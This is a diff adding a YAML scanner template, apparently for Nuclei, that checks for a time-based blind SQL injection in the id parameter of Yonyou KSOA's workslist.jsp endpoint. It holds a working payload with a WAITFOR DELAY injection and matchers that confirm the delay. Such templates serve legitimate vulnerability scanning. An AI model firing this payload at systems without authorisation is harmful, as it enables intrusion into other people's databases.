@@ -1,0 +1,32 @@
+id: yonyou-ksoa-workslist-sqli
+
+info:
+  name: 用友时空KSOA workslist.jsp SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    用友时空KSOA的/worksheet/workslist.jsp接口存在时间盲注漏洞，攻击者可通过id参数执行任意SQL命令
+    [漏洞发现时间：2025年7月]
+  reference:
+    - https://example.com/yonyou-ksoa-sqli
+  tags: 用友-时空KSOA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:3'--"
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+      Connection: close
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '登录'
